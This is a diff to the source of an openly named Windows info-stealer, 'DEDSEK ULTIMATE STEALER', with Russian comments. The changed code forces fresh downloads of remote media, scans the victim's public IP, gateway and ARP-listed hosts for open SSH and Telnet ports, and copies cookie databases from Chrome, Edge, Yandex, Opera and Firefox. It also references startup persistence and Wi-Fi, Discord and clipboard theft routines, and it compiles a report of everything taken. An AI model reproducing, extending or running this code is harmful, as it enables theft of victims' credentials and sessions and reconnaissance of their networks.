@@ -93,17 +93,21 @@ def add_to_startup():
             except: pass
     except: pass
 
-# ===== СКАЧИВАНИЕ =====
+# ===== СКАЧИВАНИЕ (ВСЕГДА НОВОЕ) =====
 def download_video():
     try:
-        if not os.path.exists(VIDEO_PATH) or os.path.getsize(VIDEO_PATH) < 1000:
-            urllib.request.urlretrieve(VIDEO_URL, VIDEO_PATH)
+        if os.path.exists(VIDEO_PATH):
+            try: os.remove(VIDEO_PATH)
+            except: pass
+        urllib.request.urlretrieve(VIDEO_URL, VIDEO_PATH)
     except: pass
 
 def download_audio():
     try:
-        if not os.path.exists(AUDIO_PATH) or os.path.getsize(AUDIO_PATH) < 1000:
-            urllib.request.urlretrieve(AUDIO_URL, AUDIO_PATH)
+        if os.path.exists(AUDIO_PATH):
+            try: os.remove(AUDIO_PATH)
+            except: pass
+        urllib.request.urlretrieve(AUDIO_URL, AUDIO_PATH)
     except: pass
 
 # ===== ВИДЕО + ЗВУК =====
@@ -129,7 +133,6 @@ def play_video_fullscreen():
         lbl = tk.Label(video, bg='black')
         lbl.pack(expand=True, fill='both')
         
-        # Запускаем звук
         try:
             import pygame
             pygame.mixer.init()
@@ -138,7 +141,6 @@ def play_video_fullscreen():
         except:
             pass
         
-        # Проигрываем видео
         cap = cv2.VideoCapture(VIDEO_PATH)
         if cap.isOpened():
             fps = cap.get(cv2.CAP_PROP_FPS)
@@ -235,17 +237,14 @@ def boot_anim():
 # ===== SSH/TELNET TARGETS =====
 def get_ssh_telnet_targets():
     targets = []
-    
     try:
         public_ip = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
         targets.append(("EXTERNAL", public_ip, "Подключение из интернета"))
     except: pass
-    
     try:
         local_ip = socket.gethostbyname(socket.gethostname())
         targets.append(("LOCAL", local_ip, "Подключение из локальной сети"))
     except: pass
-    
     try:
         route = subprocess.check_output("ipconfig | findstr /i \"шлюз\"", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
         for line in route.split('\n'):
@@ -253,7 +252,6 @@ def get_ssh_telnet_targets():
                 gw = re.findall(r'\d+\.\d+\.\d+\.\d+', line)
                 if gw and not gw[0].startswith('0.'): targets.append(("GATEWAY", gw[0], "Роутер")); break
     except: pass
-    
     try:
         arp = subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
         arp_ips = re.findall(r'\d+\.\d+\.\d+\.\d+', arp)
@@ -261,19 +259,16 @@ def get_ssh_telnet_targets():
             if ip not in [t[1] for t in targets] and not ip.endswith('.255') and not ip.endswith('.0'):
                 targets.append(("NETWORK", ip, "Устройство в сети"))
     except: pass
-    
     for i, (name, ip, desc) in enumerate(targets):
         for port in [22, 23]:
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.settimeout(1)
-                result = s.connect_ex((ip, port))
-                if result == 0:
+                if s.connect_ex((ip, port)) == 0:
                     service = "SSH" if port == 22 else "Telnet"
                     targets[i] = (name, ip, f"{desc} | {service} ОТКРЫТ!")
                 s.close()
             except: pass
-    
     return targets
 
 # ===== РАСШИФРОВКА =====
@@ -393,7 +388,6 @@ def steal_wifi_passwords():
 def steal_cookies_all():
     r = []
     cookie_paths = []
-    
     chrome_base = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
     if os.path.exists(chrome_base):
         for folder in os.listdir(chrome_base):
@@ -401,30 +395,25 @@ def steal_cookies_all():
                 for f in ['Cookies', 'Network/Cookies']:
                     cp = os.path.join(chrome_base, folder, f)
                     if os.path.exists(cp): cookie_paths.append(('CHROME', cp))
-    
     edge_base = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data')
     if os.path.exists(edge_base):
         for folder in os.listdir(edge_base):
             if folder == 'Default' or folder.startswith('Profile'):
                 cp = os.path.join(edge_base, folder, 'Cookies')
                 if os.path.exists(cp): cookie_paths.append(('EDGE', cp))
-    
     yandex_base = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data')
     if os.path.exists(yandex_base):
         for folder in os.listdir(yandex_base):
             if folder == 'Default' or folder.startswith('Profile'):
                 cp = os.path.join(yandex_base, folder, 'Cookies')
                 if os.path.exists(cp): cookie_paths.append(('YANDEX', cp))
-    
     opera_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera Stable', 'Cookies')
     if os.path.exists(opera_path): cookie_paths.append(('OPERA', opera_path))
-    
     ff_base = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
     if os.path.exists(ff_base):
         for folder in os.listdir(ff_base):
             ff_cookie = os.path.join(ff_base, folder, 'cookies.sqlite')
             if os.path.exists(ff_cookie): cookie_paths.append(('FIREFOX', ff_cookie))
-    
     for browser, cp in cookie_paths:
         try:
             db = os.path.join(tempfile.gettempdir(), f'cookie_{browser}_{random.randint(0,9999)}.db')
@@ -449,7 +438,6 @@ def steal_cookies_all():
             try: os.remove(db)
             except: pass
         except: pass
-    
     return r[:500] if r else ["Cookies not found"]
 
 def steal_discord():
@@ -582,19 +570,14 @@ def steal_clipboard():
 # ===== МЕГА-СТИЛЕР =====
 def mega_steal():
     targets = get_ssh_telnet_targets()
-    
-    report = []
-    report.append("="*60)
-    report.append("DEDSEK ULTIMATE STEALER")
-    report.append("="*60)
-    report.append(f"\nUSER: {os.environ.get('USERNAME')}")
-    report.append(f"PC: {socket.gethostname()}")
+    report = ["="*60, "DEDSEK ULTIMATE STEALER", "="*60]
+    report.append(f"\nUSER: {os.environ.get('USERNAME')} | PC: {socket.gethostname()}")
     
     report.append("\n" + "="*60)
     report.append("SSH/TELNET TARGETS")
     report.append("="*60)
     for name, ip, desc in targets:
-        report.append(f"{name:<10} {ip:<18} {desc}")
+        report.append(f"{name}: {ip} - {desc}")
     
     report.append("\n" + "="*60)
     report.append("ПАРОЛИ БРАУЗЕРОВ")
